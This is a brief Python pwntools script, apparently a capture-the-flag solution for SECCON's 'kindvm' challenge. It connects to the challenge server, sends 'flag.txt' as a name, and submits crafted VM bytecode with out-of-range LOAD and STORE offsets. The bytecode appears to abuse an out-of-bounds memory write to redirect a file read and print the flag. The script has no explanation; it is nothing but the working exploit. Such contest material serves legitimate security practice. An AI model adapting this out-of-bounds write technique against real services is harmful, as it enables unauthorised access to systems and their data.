from pwn import *

LOAD  = '\x01'
STORE = '\x02'
HALT  = '\x06'

r = remote('kindvm.pwn.seccon.jp', 12345)

instruction = ''
instruction += LOAD + '\x00' + '\xff\xd8'
instruction += STORE + '\xff\xdc' + '\x00'
instruction += HALT

r.sendlineafter('Input your name : ', 'flag.txt')
r.sendlineafter('Input instruction : ', instruction)

r.interactive()
